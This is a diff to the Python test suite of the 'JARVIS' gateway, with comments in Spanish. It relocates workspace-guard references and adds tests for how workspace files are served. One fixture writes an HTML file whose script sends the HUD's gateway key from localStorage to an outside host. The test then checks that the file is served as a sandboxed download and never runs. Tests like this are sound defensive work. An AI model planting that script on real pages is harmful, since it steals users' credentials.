@@ -15,6 +15,7 @@ from jarvis_core.goals.store import GoalStore
 from jarvis_core.tools.base import ToolResult
 from jarvis_core.voice import WakeWordDetector
 from jarvis_gateway import app as gateway_module
+from jarvis_gateway.routers import workspace as workspace_router
 from jarvis_gateway.voice import prepare_speech_text
 
 
@@ -967,7 +968,7 @@ def test_the_workspace_guard_is_built_with_the_setting_that_exists(explorer_work
     El endpoint lo capturaba y devolvía una carpeta vacía, así que el explorador
     no mostraba nada y el motivo no aparecía por ningún lado.
     """
-    guard = gateway_module._get_workspace_guard()
+    guard = workspace_router._get_workspace_guard()
     assert guard.max_file_bytes == gateway_module.settings.workspace_max_file_bytes
 
 
@@ -999,7 +1000,7 @@ def test_a_broken_workspace_reports_the_failure_instead_of_looking_empty(
     def explode():
         raise RuntimeError("configuración rota")
 
-    monkeypatch.setattr(gateway_module, "_get_workspace_guard", explode)
+    monkeypatch.setattr(workspace_router, "_get_workspace_guard", explode)
     with TestClient(gateway_module.app) as client:
         response = client.get("/workspace/tree", headers={"X-Jarvis-Key": "ci-test-key"})
     assert response.status_code == 500
@@ -1103,3 +1104,60 @@ def test_the_history_endpoint_reports_what_happened(task_store):
     assert body["runs"][0]["ok"] is True
     assert body["runs"][0]["detail"] == "Todo en orden."
     assert client.get("/tasks/history").status_code == 401
+
+
+# ── Cómo se entrega un archivo del workspace ─────────────────────────────────
+#
+# `/workspace/file/raw` sirve archivos del workspace en el mismo origen que el
+# HUD, y el HUD guarda la llave del gateway en `localStorage`. Un `.html` en el
+# workspace servido con su propio tipo se ejecutaría con ese origen y podría
+# leerla. Y JARVIS escribe en el workspace: basta con que cree un fichero —o que
+# alguien lo deje en la carpeta montada— para que abrirlo entregue la llave.
+
+
+def test_a_workspace_html_file_is_never_served_as_a_page(explorer_workspace):
+    (explorer_workspace / "trampa.html").write_text(
+        "<script>fetch('http://fuera/?k='+localStorage.jarvis_hubKey)</script>",
+        encoding="utf-8",
+    )
+    with TestClient(gateway_module.app) as client:
+        response = client.get(
+            "/workspace/file/raw",
+            params={"path": "trampa.html", "token": "ci-test-key"},
+        )
+    assert response.status_code == 200
+    # No se entrega como HTML, y el navegador tiene prohibido adivinarlo.
+    assert "text/html" not in response.headers["content-type"]
+    assert response.headers["x-content-type-options"] == "nosniff"
+    # Se descarga en vez de abrirse.
+    assert response.headers["content-disposition"].startswith("attachment")
+    # Y aunque algo llegara a interpretarse, sin origen ni scripts no alcanza al
+    # almacenamiento del HUD.
+    assert "sandbox" in response.headers["content-security-policy"]
+
+
+def test_an_image_still_opens_inline_because_el_hud_la_muestra(explorer_workspace):
+    """La vista previa dejaría de funcionar si todo bajara como descarga."""
+    png = bytes.fromhex("89504e470d0a1a0a")
+    (explorer_workspace / "captura.png").write_bytes(png)
+    with TestClient(gateway_module.app) as client:
+        response = client.get(
+            "/workspace/file/raw",
+            params={"path": "captura.png", "token": "ci-test-key"},
+        )
+    assert response.status_code == 200
+    assert response.headers["content-type"] == "image/png"
+    assert "content-disposition" not in response.headers
+    # El nosniff se mantiene igualmente: una imagen falsa no debe adivinarse.
+    assert response.headers["x-content-type-options"] == "nosniff"
+
+
+def test_the_raw_endpoint_checks_the_key_before_anything_else(explorer_workspace):
+    with TestClient(gateway_module.app) as client:
+        sin_llave = client.get("/workspace/file/raw", params={"path": "notas.md"})
+        mal = client.get(
+            "/workspace/file/raw",
+            params={"path": "notas.md", "token": "llave-equivocada"},
+        )
+    assert sin_llave.status_code == 401
+    assert mal.status_code == 401
